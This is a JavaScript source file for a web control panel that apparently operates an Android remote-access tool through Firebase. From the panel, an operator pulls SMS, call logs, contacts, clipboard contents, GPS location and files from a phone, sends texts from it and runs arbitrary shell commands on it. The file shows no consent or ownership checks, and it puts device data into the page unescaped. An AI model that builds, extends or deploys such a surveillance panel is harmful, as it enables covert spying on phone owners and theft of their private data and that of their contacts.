class AndroidControlDashboard {
    constructor() {
        this.currentUser = null;
        this.currentDevice = null;
        this.deviceList = new Map();
        this.commandQueue = [];
        this.isProcessingCommand = false;

        this.init();
    }

    init() {
        this.setupEventListeners();
        this.setupAuthListener();
        this.setupUIInteractions();
    }

    // Authentication Methods
    setupAuthListener() {
        // Wait for Firebase to be ready
        if (typeof firebase === 'undefined' || !firebase.apps.length) {
            setTimeout(() => this.setupAuthListener(), 100);
            return;
        }

        auth.onAuthStateChanged((user) => {
            if (user) {
                this.currentUser = user;
                this.showDashboard();
                this.initializeDeviceMonitoring();
                this.showToast('Signed in successfully', 'success');
            } else {
                this.currentUser = null;
                this.showAuthScreen();
            }
        });
    }

    async signIn(email, password) {
        try {
            this.showLoading(true);
            await auth.signInWithEmailAndPassword(email, password);
        } catch (error) {
            this.showToast(this.getErrorMessage(error), 'error');
            this.showLoading(false);
        }
    }

    async signOut() {
        try {
            await auth.signOut();
            this.showToast('Signed out successfully', 'success');
        } catch (error) {
            this.showToast('Error signing out', 'error');
        }
    }

    // UI Methods
    showAuthScreen() {
        document.getElementById('authScreen').classList.remove('hidden');
        document.getElementById('dashboard').classList.add('hidden');
    }

    showDashboard() {
        document.getElementById('authScreen').classList.add('hidden');
        document.getElementById('dashboard').classList.remove('hidden');
    }

    showLoading(show) {
        const overlay = document.getElementById('loadingOverlay');
        if (show) {
            overlay.classList.remove('hidden');
        } else {
            overlay.classList.add('hidden');
        }
    }

    showToast(message, type = 'info') {
        const container = document.getElementById('toastContainer');
        const toast = document.createElement('div');
        toast.className = `toast ${type}`;

        const icon = this.getToastIcon(type);
        toast.innerHTML = `
            <span class="material-icons">${icon}</span>
            <span>${message}</span>
        `;

        container.appendChild(toast);

        setTimeout(() => {
            toast.remove();
        }, 5000);
    }

    getToastIcon(type) {
        const icons = {
            'success': 'check_circle',
            'error': 'error',
            'warning': 'warning',
            'info': 'info'
        };
        return icons[type] || 'info';
    }

    // Device Management
    initializeDeviceMonitoring() {
        if (!this.currentUser) return;

        // Monitor devices for current user
        const userDevicesRef = database.ref(`users/${this.currentUser.uid}/devices`);
        userDevicesRef.on('value', (snapshot) => {
            this.deviceList.clear();
            if (snapshot.exists()) {
                const devices = snapshot.val();
                Object.keys(devices).forEach(deviceId => {
                    this.deviceList.set(deviceId, devices[deviceId]);
                });
                this.updateDeviceStatus();

                // Auto-select first device if none selected
                if (!this.currentDevice && this.deviceList.size > 0) {
                    this.currentDevice = this.deviceList.keys().next().value;
                    this.showToast(`Connected to device: ${this.currentDevice}`, 'info');
                }
            } else {
                this.updateDeviceStatus();
            }
        }, (error) => {
            console.error('Device monitoring error:', error);
            this.showToast('Failed to monitor devices', 'error');
        });
    }

    updateDeviceStatus() {
        const statusElement = document.getElementById('deviceStatus');
        const indicator = statusElement.querySelector('.status-indicator');
        const text = statusElement.querySelector('span:last-child');

        if (this.deviceList.size > 0) {
            indicator.classList.remove('offline');
            indicator.classList.add('online');
            text.textContent = `${this.deviceList.size} device(s) online`;
        } else {
            indicator.classList.remove('online');
            indicator.classList.add('offline');
            text.textContent = 'No devices';
        }
    }

    // Command Execution
    async executeCommand(command, params = {}) {
        if (!this.currentUser) {
            this.showToast('Please sign in first', 'warning');
            return;
        }

        if (!this.currentDevice) {
            this.showToast('No device connected. Please ensure your Android device is online.', 'warning');
            return;
        }

        try {
            this.showLoading(true);
            this.logCommand(command, params);

            const commandData = {
                command: command,
                params: params,
                timestamp: Date.now(),
                status: 'pending',
                userId: this.currentUser.uid
            };

            // Send command to device
            const commandRef = database.ref(`users/${this.currentUser.uid}/devices/${this.currentDevice}/commands`);
            const newCommandRef = await commandRef.push(commandData);

            // Listen for result with timeout
            this.listenForCommandResult(command, newCommandRef.key);

            this.showToast(`Command "${command}" sent successfully`, 'success');
        } catch (error) {
            this.showToast(`Failed to send command: ${error.message}`, 'error');
            this.logError(command, error.message);
        } finally {
            this.showLoading(false);
        }
    }

    listenForCommandResult(command, commandId) {
        const resultRef = database.ref(`users/${this.currentUser.uid}/devices/${this.currentDevice}/results`);

        let timeout = setTimeout(() => {
            resultRef.off('child_added');
            this.showToast(`Command "${command}" timed out`, 'warning');
            this.logError(command, 'Command timed out - device may be offline');
        }, 30000); // 30 second timeout

        const listener = resultRef.on('child_added', (snapshot) => {
            const result = snapshot.val();
            if (result.commandId === commandId || result.command === command) {
                clearTimeout(timeout);
                this.handleCommandResult(result);
                resultRef.off('child_added', listener);
            }
        });
    }

    handleCommandResult(result) {
        const { command, data, status, error } = result;

        if (status === 'success') {
            this.displayCommandResult(command, data);
            this.logSuccess(command, data);
        } else {
            this.logError(command, error || 'Unknown error');
            this.showToast(`Command failed: ${error}`, 'error');
        }
    }

    displayCommandResult(command, data) {
        switch (command) {
            case 'get_info':
                this.displayDeviceInfo(data);
                break;
            case 'get_location':
                this.displayLocationInfo(data);
                break;
            case 'get_sms':
            case 'get_call_logs':
            case 'get_contacts':
            case 'get_apps':
                this.displayListData(command, data);
                break;
            case 'get_files':
                this.displayFileList(data);
                break;
            case 'get_clipboard':
                this.displayClipboardData(data);
                break;
            default:
                this.logInfo(command, JSON.stringify(data, null, 2));
        }
    }

    displayDeviceInfo(data) {
        const element = document.getElementById('deviceInfo');
        element.innerHTML = `
            <strong>Device:</strong> ${data.model || 'Unknown'}<br>
            <strong>OS:</strong> Android ${data.version || 'Unknown'}<br>
            <strong>Battery:</strong> ${data.battery || 'Unknown'}%<br>
            <strong>Storage:</strong> ${data.storage || 'Unknown'}<br>
            <strong>Network:</strong> ${data.network || 'Unknown'}
        `;
    }

    displayLocationInfo(data) {
        const element = document.getElementById('locationInfo');
        if (data.latitude && data.longitude) {
            element.innerHTML = `
                <strong>Latitude:</strong> ${data.latitude}<br>
                <strong>Longitude:</strong> ${data.longitude}<br>
                <strong>Address:</strong> ${data.address || 'Unknown'}<br>
                <a href="https://maps.google.com/?q=${data.latitude},${data.longitude}" target="_blank">
                    View on Google Maps
                </a>
            `;
        } else {
            element.innerHTML = 'Location not available';
        }
    }

    displayListData(command, data) {
        const logContainer = document.getElementById('logsList');
        const logEntry = this.createLogEntry(`${command} results`, JSON.stringify(data, null, 2), 'info');
        logContainer.appendChild(logEntry);
        logContainer.scrollTop = logContainer.scrollHeight;
    }

    displayFileList(files) {
        const container = document.getElementById('fileList');
        container.innerHTML = '';

        if (!files || files.length === 0) {
            container.innerHTML = '<p>No files found</p>';
            return;
        }

        files.forEach(file => {
            const fileItem = document.createElement('div');
            fileItem.className = 'file-item';

            const icon = file.isDirectory ? 'folder' : 'description';
            fileItem.innerHTML = `
                <span class="material-icons">${icon}</span>
                <span>${file.name}</span>
                <span style="margin-left: auto; font-size: 0.8rem; color: #666;">
                    ${file.size || ''}
                </span>
            `;

            if (!file.isDirectory) {
                fileItem.addEventListener('click', () => {
                    this.downloadFile(file.path);
                });
                fileItem.style.cursor = 'pointer';
            }

            container.appendChild(fileItem);
        });
    }

    displayClipboardData(data) {
        this.logInfo('clipboard', data.text || 'No clipboard data');
    }

    // Logging Methods
    logCommand(command, params) {
        this.addLogEntry(`> ${command} ${JSON.stringify(params)}`, 'info');
    }

    logSuccess(command, data) {
        this.addLogEntry(`✓ ${command} completed successfully`, 'success');
    }

    logError(command, error) {
        this.addLogEntry(`✗ ${command} failed: ${error}`, 'error');
    }

    logInfo(command, message) {
        this.addLogEntry(`ℹ ${command}: ${message}`, 'info');
    }

    addLogEntry(message, type) {
        const container = document.getElementById('logsList');
        const entry = this.createLogEntry(message, '', type);
        container.appendChild(entry);
        container.scrollTop = container.scrollHeight;
    }

    createLogEntry(message, details = '', type = 'info') {
        const entry = document.createElement('div');
        entry.className = `log-entry ${type}`;

        const timestamp = new Date().toLocaleTimeString();
        entry.innerHTML = `
            <div class="log-timestamp">${timestamp}</div>
            <div>${message}</div>
            ${details ? `<pre style="margin-top: 0.5rem; font-size: 0.8rem;">${details}</pre>` : ''}
        `;

        return entry;
    }

    clearLogs() {
        document.getElementById('logsList').innerHTML = '';
    }

    // Specific Command Methods
    async sendSMS() {
        const number = document.getElementById('smsNumber').value;
        const message = document.getElementById('smsMessage').value;

        if (!number || !message) {
            this.showToast('Please enter both number and message', 'warning');
            return;
        }

        await this.executeCommand('send_sms', { number, message });

        // Clear inputs
        document.getElementById('smsNumber').value = '';
        document.getElementById('smsMessage').value = '';
    }

    async textToSpeech() {
        const text = document.getElementById('ttsText').value;

        if (!text) {
            this.showToast('Please enter text to speak', 'warning');
            return;
        }

        await this.executeCommand('tts', { text });
        document.getElementById('ttsText').value = '';
    }

    async openApp() {
        const packageName = document.getElementById('appPackage').value;

        if (!packageName) {
            this.showToast('Please enter app package name', 'warning');
            return;
        }

        await this.executeCommand('open_app', { package: packageName });
        document.getElementById('appPackage').value = '';
    }

    async browseFiles() {
        const path = document.getElementById('filePath').value || '/sdcard';
        await this.executeCommand('get_files', { path });
    }

    async downloadFile() {
        const path = document.getElementById('downloadPath').value;

        if (!path) {
            this.showToast('Please enter file path', 'warning');
            return;
        }

        await this.executeCommand('download_file', { path });
        document.getElementById('downloadPath').value = '';
    }

    async playSound() {
        const url = document.getElementById('soundUrl').value;

        if (!url) {
            this.showToast('Please enter sound URL', 'warning');
            return;
        }

        await this.executeCommand('play_sound', { url });
        document.getElementById('soundUrl').value = '';
    }

    async executeShell() {
        const command = document.getElementById('shellCommand').value;

        if (!command) {
            this.showToast('Please enter shell command', 'warning');
            return;
        }

        await this.executeCommand('shell', { command });
        document.getElementById('shellCommand').value = '';
    }

    async openURL() {
        const url = document.getElementById('openUrl').value;

        if (!url) {
            this.showToast('Please enter URL', 'warning');
            return;
        }

        await this.executeCommand('open_url', { url });
        document.getElementById('openUrl').value = '';
    }

    // Event Listeners Setup
    setupEventListeners() {
        // Auth form submission
        document.getElementById('authForm').addEventListener('submit', (e) => {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            this.signIn(email, password);
        });

        // Logout button
        document.getElementById('logoutBtn').addEventListener('click', () => {
            this.signOut();
        });

        // Menu toggle for mobile
        document.getElementById('menuToggle').addEventListener('click', () => {
            const sidebar = document.getElementById('sidebar');
            const sidebarBackdrop = document.getElementById('sidebarBackdrop');
            sidebar.classList.toggle('open');
            sidebarBackdrop.classList.toggle('show');
        });

        // Sidebar navigation
        document.querySelectorAll('.sidebar-menu a').forEach(link => {
            link.addEventListener('click', (e) => {
                e.preventDefault();
                const section = link.dataset.section;
                this.showSection(section);

                // Update active state
                document.querySelectorAll('.sidebar-menu a').forEach(l => l.classList.remove('active'));
                link.classList.add('active');

                // Close sidebar on mobile
                if (window.innerWidth <= 768) {
                    document.getElementById('sidebar').classList.remove('open');
                }
            });
        });
    }

    setupUIInteractions() {
        // Show overview section by default
        this.showSection('overview');
        document.querySelector('[data-section="overview"]').classList.add('active');
    }

    showSection(sectionName) {
        // Hide all sections
        document.querySelectorAll('.content-section').forEach(section => {
            section.classList.remove('active');
        });

        // Show selected section
        document.getElementById(sectionName).classList.add('active');
    }

    // Utility Methods
    getErrorMessage(error) {
        const errorMessages = {
            'auth/user-not-found': 'No user found with this email',
            'auth/wrong-password': 'Incorrect password',
            'auth/invalid-email': 'Invalid email address',
            'auth/too-many-requests': 'Too many failed login attempts',
            'auth/network-request-failed': 'Network error. Please check your connection'
        };

        return errorMessages[error.code] || error.message;
    }
}

// Global functions for button onclick handlers
let dashboard;

function executeCommand(command) {
    dashboard.executeCommand(command);
}

function sendSMS() {
    dashboard.sendSMS();
}

function textToSpeech() {
    dashboard.textToSpeech();
}

function openApp() {
    dashboard.openApp();
}

function browseFiles() {
    dashboard.browseFiles();
}

function downloadFile() {
    dashboard.downloadFile();
}

function playSound() {
    dashboard.playSound();
}

function executeShell() {
    dashboard.executeShell();
}

function openURL() {
    dashboard.openURL();
}

function clearLogs() {
    dashboard.clearLogs();
}

// Initialize dashboard when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    dashboard = new AndroidControlDashboard();
});

// Export for global access
window.dashboard = dashboard;